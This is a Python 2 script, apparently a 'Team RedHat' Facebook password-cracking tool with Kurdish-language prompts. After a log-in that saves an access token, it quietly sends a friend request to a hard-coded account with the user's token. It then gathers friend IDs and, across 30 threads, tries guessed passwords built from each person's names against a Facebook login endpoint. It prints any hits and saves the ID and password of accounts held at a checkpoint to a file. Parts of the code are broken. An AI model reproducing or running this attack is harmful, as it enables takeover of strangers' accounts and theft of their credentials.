#!/ufr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
print("FB GRABER")
os.system('clear')




reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]


def kelwa():
	print "\x1b[1;96m🚶‍ Chwna dara wa"
	os.sys.exit()
                                        
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def anime(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.1)


#### LOGO ####
logo = """

\x1b[31;1m8888888b.          8888888b. \x1b[37;1m 888    888      88888888888 
\x1b[31;1m888   Y88b         888  "Y88b\x1b[37;1m 888    888          888     
\x1b[31;1m888    888         888    888\x1b[37;1m 888    888          888     
\x1b[31;1m888   d88P .d88b.  888    888\x1b[37;1m 8888888888  8888b.  888     
\x1b[31;1m8888888P" d8P  Y8b 888    888\x1b[37;1m 888    888     "88b 888     
\x1b[31;1m888 T88b  88888888 888    888\x1b[37;1m 888    888 .d888888 888     
\x1b[31;1m888  T88b Y8b.     888  .d88P\x1b[37;1m 888    888 888  888 888     
\x1b[31;1m888   T88b "Y8888  8888888P" \x1b[37;1m 888    888 "Y888888 888     

"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mtkaya bosta \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\x1b[37;1m+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×++×+×+×+×+
\x1b[31;1m@            Team RedHat                 @
\x1b[31;1m@         Version: 1.5.0                 @
\x1b[31;1m@         Cre: Baha J.Hex                @
\x1b[31;1m@                                        @
\x1b[37;1m+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×+×++×+×+×+×+
                         
"""
RH = """
\x1b[31;1m .----------------. \x1b[37;1m  .----------------. 
\x1b[31;1m| .--------------. |\x1b[37;1m | .--------------. |
\x1b[31;1m| |  _______     | |\x1b[37;1m | |  ____  ____  | |
\x1b[31;1m| | |_   __ \    | |\x1b[37;1m | | |_   ||   _| | |
\x1b[31;1m| |   | |__) |   | |\x1b[37;1m | |   | |__| |   | |
\x1b[31;1m| |   |  __ /    | |\x1b[37;1m | |   |  __  |   | |
\x1b[31;1m| |  _| |  \ \_  | |\x1b[37;1m | |  _| |  | |_  | |
\x1b[31;1m| | |____| |___| | |\x1b[37;1m | | |____||____| | |
\x1b[31;1m| |              | |\x1b[37;1m | |              | |
\x1b[31;1m| '--------------' |\x1b[37;1m | '--------------' |
\x1b[31;1m '----------------' \x1b[37;1m  '----------------' 
"""
print(RH)
CorrectUsername = "REDHAT"
CorrectPassword = "REDHAT"
loop = 'true'
while (loop == 'true'):
    username = raw_input("\x1b[34;1m👨‍ \x1b[1;95mID \x1b[31;1m@Red>>\x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\x1b[34;1m🤖 \x1b[1;95mID Paswword \x1b[37;1m@Hat>> \x1b[1;91m")
                                                                               
        if (password == CorrectPassword):
            print "daxl bwet ba ID " + username #Noop=hacker
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96m password kat halaya"
            print " tkaya bba andam la group RedHat ta ID w pass dast kawet"
    else:
        print "\033[1;96mID kat halaya "
        print "tkaya bba andam la group RedHat ta ID w pass dast kawet"

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print('tkaya facebook k daxl ka ')
		print('\x1b[31;1m<-------------$\x1b[36;1mLOGIN\x1b[31;1m$------------->')
		id = raw_input('\x1b[35;1m[🆔️]¤EMAIL/ID¤♤> \x1b[37;1m')
		pwd = raw_input('\x1b[35;1m[⛔]¤PASSWORD¤♡> \x1b[31;1m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[31;1m INTERNET CONNECTION LOST"
			kelwa()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[32;1m[✓]Login bw basar kawtwe'
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[31;1m[!]There is no connection[!]"
				kelwa()
		if 'checkpoint' in url:
			print("\n\x1b[31;1m[!] bbwra am account la checkpoint ya bakar nayat[!]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			kelwa()
		else:
			print("\n\x1b[31;1m[¿]Email w Password t halaya[¿]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[[31;1m[♤] bbwra Token ka halaya [♤]"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		namefb = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		subid = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91m account kat la checkpoint ya"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		kelwa()
	os.system("clear")
	print logo
	#INFORMATION OF USER
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\x1b[32;1mRED×HAT/ Name >>"+namefb
	print "\x1b[34;1mRED×HAT/ ID >>"+id
	print '\x1b[33;1mRED×HAT/ TotalSub >>'+subid
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print ""
	print "===================="
	print "\x1b[37;1m[1]> dast pekrdn ba hack"
	print "\x1b[37;1m[2]> bo update krdna wa"
	print "\x1b[37;1m[0]> darchwn"
	print "===================="
	#INFORMATION OF USER
	option()

def option():
	unikers = raw_input("\n\x1b[31;1mRED\x1b[37;1mHAT>>\x1b[33;1m")
	if unikers =="":
		print "\x1b[31;1m[!]tkaya boshaya ka ba batale je mahela"
		option()
	elif unikers =="1":
		graber()
	elif unikers =="2":
		os.system('clear')
		print logo
		anime("<<<<<<<<PREPARE TO ♡●♡UPDATE TOOL >>>>>>")
		os.system('bash update.sh')
	elif unikers =="0":
		anime('LOGIN OUT ACCOUNT PLEASE WAIT')
		os.system('rm -rf login.txt')
		kelwa()
	else:
		print "\x1b[31;1m tkaya shte xayr awana manwsa"
		option()

def graber():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[31;1mToken k halaya tka ya daxl bara wa"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[31;1m{1}~~Hack krdn la regay friend wa "
	print "\x1b[31;1m{2}~~Hack krdn la regay ID public kawa "
	print "\x1b[31;1m{0}~~chwna darawa"
	startgrab()

def startgrab():
	peak = raw_input("Red+Hat>> ")
	if peak=="":
		print "\x1b[1;91mtkaya bosha yaka ba batale je mahela"
		startgrab()
	elif peak =="1":
		os.system('clear')
		password1 = raw_input("")
		print logo
		print "@@@@@@@@@@@#Red÷Hat#@@@@@@@@@@@"
		anime('\033[1;91mwar grtne ID kan \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("[♤]ID kasaka bnwsa>>>")
		print "@@@@@@@@@@@#Red÷Hat#@@@@@@@@@@@"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"Redhat/ Name :  "+op["name"]
		except KeyError:
			print"\x1b[31;1mBbwra ID ka na dozra yawa"
			raw_input("[GARANAWA]enter bka")
			graber()
		print"\x1b[32;1mWargrtne ID...."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91mtkaya bosha ya ka ba jwane pr kara wa"
		startgrab()
	
	print "\x1b[32;1m[♡]koe ID kan>>"+str(len(id))
	anime('tkaya bosta.................................')
	titik = ['.   ','..  ','... ','....','.....']
	for o in titik:
		print("\r\x1b[37;1m[☆]Cracking"+o),;sys.stdout.flush();time.sleep(1)
	print "\n                            \x1b[37;1m <●>°•°<●>RedHat<●>°•°<●>"
	print "   \x1b[31;1m#############################################################"

	anime('          \x1b[34;1m  dastpe krdn  tkaya bosta..... ')
	print  "  \033[1;92m#############################################################" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('Graber')
		except OSError:
			pass #REDHaT
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '123321'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[37;1m Hack kraw'											
				print '\x1b[37;1mNAWE >>> '+ b['name']											
				print '\x1b[37;1mID kay >>>' + user											
				print '\x1b[37;1mPASSWORD kay >>>' + pass1 + '\n'											
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[37;1maccount ka la Checkpoint ya'
				    print '\x1b[37;1m NAWE >>> ' + b ['name']
				    print '\x1b[37;1mID kay >>> ' + user
				    print '\x1b[37;1mPASSWORD kay >>> ' + pass1 + '\n'
				    cek = open("Graber/Id_pass.txt", "a")
				    cek.write("ID:" +user+ " Password:" +pass1+"\n")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = b['first_name'] + '112233'										
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[37;1m Hack kraw'											
				            print '\x1b[37;1mNAWE >>> '+ b['name']											
				            print '\x1b[37;1mID kay >>>' + user											
				            print '\x1b[37;1mPASSWORD kay >>>' + pass2 + '\n'													
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[37;1maccount ka la Checkpoint ya'
				               print '\x1b[37;1m NAWE >>> ' + b ['name']
				               print '\x1b[37;1mID kay >>> ' + user
				               print '\x1b[37;1mPASSWORD kay >>> ' + pass2  + '\n'
				               cek = open("Graber/id_pass.txt", "a")
				               cek.write("ID:" +user+ " Pass:" +pass2+"\n")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = b['first_name']+'123123'										
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[37;1m Hack kraw'											
				                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                       print '\x1b[37;1mID kay >>>' + user											
				                       print '\x1b[37;1mPASSWORD kay >>>' + pass3 + '\n'									
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[37;1maccount ka la Checkpoint ya'
				                           print '\x1b[37;1m NAWE >>> ' + b ['name']
				                           print '\x1b[37;1mID kay >>> ' + user
				                           print '\x1b[37;1mPASSWORD kay >>> ' + pass3 + '\n'
				                           cek = open("Graber/id_pass.txt", "a")
				                           cek.write("ID:" +user+ " Pass:" +pass3+"\n")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 = b['first_name'] + '11223344'											
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:		
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[37;1m Hack kraw'											
				                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                   print '\x1b[37;1mID kay >>>' + user											
				                                   print '\x1b[37;1mPASSWORD kay >>>' + pass4  + '\n'											
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[37;1maccount ka la Checkpoint ya'
				                                       print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                       print '\x1b[37;1mID kay >>> ' + user
				                                       print '\x1b[37;1mPASSWORD kay >>> ' + pass4 + '\n'
				                                       cek = open("Graber/id_pass.txt", "a")
				                                       cek.write("ID:" +user+ " Pass:" +pass4+"\n")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = b['first_name'] + '1122334455'												
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[37;1m Hack kraw'											
				                                               print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                               print '\x1b[37;1mID kay >>>' + user											
				                                               print '\x1b[37;1mPASSWORD kay >>>' + pass5  + '\n'							
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                   print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                   print '\x1b[37;1mID kay >>> ' + user
				                                                   print '\x1b[37;1mPASSWORD kay >>> ' + pass5 + '\n'
				                                                   cek = open("Graber/id_pass.txt", "a")
				                                                   cek.write("ID:" +user+ " Pass:" +pass5+"\n")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = b['first_name'] + b['last_name'] + '123'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:	
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[37;1m Hack kraw'											
				                                                           print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                           print '\x1b[37;1mID kay >>>' + user											
				                                                           print '\x1b[37;1mPASSWORD kay >>>' + pass6  + '\n'											
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                               print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                               print '\x1b[37;1mID kay >>> ' + user
				                                                               print '\x1b[37;1mPASSWORD kay >>> ' + pass6  + '\n'
				                                                               cek = open("Graber/id_pass.txt", "a")
				                                                               cek.write("ID:" +user+ " Pass:" +pass6+"\n")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = b['first_name'] + '112233' + b['last_name']						
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[37;1m Hack kraw'											
				                                                                       print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                       print '\x1b[37;1mID kay >>>' + user											
				                                                                       print '\x1b[37;1mPASSWORD kay >>>' + pass7  + '\n'					
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                                           print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                                           print '\x1b[37;1mID kay >>> ' + user
				                                                                           print '\x1b[37;1mPASSWORD kay >>> ' + pass7  + '\n'
				                                                                           cek = open("Graber/id_pass.txt", "a")
				                                                                           cek.write("ID:" +user+ " Pw:" +pass7+"\n")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 = b['first_name'] + '123321' + b['last_name']											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:		
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[37;1m Hack kraw'											
				                                                                                   print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                                   print '\x1b[37;1mID kay >>> ' + user											
				                                                                                   print '\x1b[37;1mPASSWORD kay >>>' + pass8  + '\n'			
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                                                       print '\x1b[37;1mNAWE >>> ' + b ['name']
				                                                                                       print '\x1b[37;1mID kay >>> '  + user
				                                                                                       print '\x1b[37;1mPASSWORD kay >>> ' + pass8  + '\n'
				                                                                                       cek = open("Graber/id_pass.txt", "a")
				                                                                                       cek.write("ID:" +user+ " Pw:" +pass8+"\n")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = b['first_name'] + '123' + b['last_name']					
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[37;1m Hack kraw'											
				                                                                                               print '\x1b[37;1mNAWE >>> '+ b['name']											
				                                                                                               print '\x1b[37;1mID kay >>>' + user											
				                                                                                               print '\x1b[37;1mPASSWORD kay >>>' + pass9  + '\n'			
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[37;1maccount ka la Checkpoint ya'
				                                                                                                   print '\x1b[37;1m NAWE >>> ' + b ['name']
				                                                                                                   print '\x1b[37;1mID kay >>> ' + user
				                                                                                                   print '\x1b[37;1mPASSWORD kay >>> ' + pass9  + '\n'
				                                                                                                   cek = open("Graber/id_pass.txt", "a")
				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
				                                                                                                   cekpoint.append(user+pass9)		
											                                       
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        anime("\x1b[32;1m>>>>>>>>>>>>>>>\x1b[31;1mRed\x1b[37;1mHat\x1b[32;1m<<<<<<<<<<<<<<<")
	
	print '\x1b[32;1m Crack krdna ka kotay hat [√]^_^ '
	print"\x1b[31;1mKoy HITS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m"+str(len(oks))+"\x1b[31;1m/\x1b[33;1m"+str(len(cekpoint))
	print ""
	print(logo)
	anime("\x1b[37;1mRecode by Baha J. Hex" )#RedHat
	anime("==========MEMBER==========")
	anime("7ama. Software")
	anime("AvA. Software ")
	anime("Xalo. Software ")
	anime("Baha J. Hex")
	anime("Deniz ")
	anime("Ahmad. Software")
	anime("Zryan. Nobody")
	anime("Code Boy")
	anime("Rasho. IT")
	anime("Landi")
	anime("Mr .Xatar")
	anime("==========MEMBER==========")
	print ""
	print ""
	raw_input("\n\x1b[31;1m [DWBARA KRDNA WA] enter bka")
	menu()

if __name__ == '__main__':
	login()

